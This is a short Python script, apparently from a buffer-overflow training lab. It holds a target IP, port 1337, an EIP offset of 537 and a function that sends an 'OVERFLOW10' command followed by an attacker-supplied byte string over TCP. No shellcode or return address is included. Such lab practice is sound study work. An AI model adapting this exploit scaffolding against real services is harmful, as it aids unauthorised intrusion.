#!/usr/bin/python3
import socket


IP = "10.10.254.111"        # Change this to target IP
PORT = 1337			      # Change this to target port
offset = 537    	  # Change this when discover the offset EIP number.
COMMAND = b"OVERFLOW10 "   # Command we are testing the buffer overflow exploit

ADDRESS = (IP, PORT)
TIMEOUT = 5


def sendMaliciousCommand(string):
	print("Preparing socket...", end="")
	socketVar = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socketVar.settimeout(TIMEOUT)
	connect = socketVar.connect(ADDRESS)
	socketVar.recv(1024)
	print(f" Sending command with {len(string)} bytes")
	socketVar.send(COMMAND + string + b"\r\n")
	socketVar.recv(1024)
	socketVar.close()
